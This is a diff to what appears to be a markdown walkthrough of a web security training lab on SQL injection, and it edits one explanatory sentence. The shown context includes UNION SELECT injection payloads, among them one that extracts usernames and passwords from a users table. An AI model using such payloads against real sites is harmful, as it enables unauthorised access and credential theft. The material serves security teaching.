@@ -41,7 +41,7 @@ Trying the following parameters
 FULL URL: `https://acb71f2e1ee8c3c9c0d843a6003d0023.web-security-academy.net/filter?category=Gift' UNION SELECT 'abc','def'--`
 
 ### 3. Fetch the usernames & passwords
-We can now use `UNION` attack to return the random value with the NULL fields.
+We can now use `UNION` attack to return the random value with usernames & password.
 
 `' UNION SELECT username, password from users--`
 
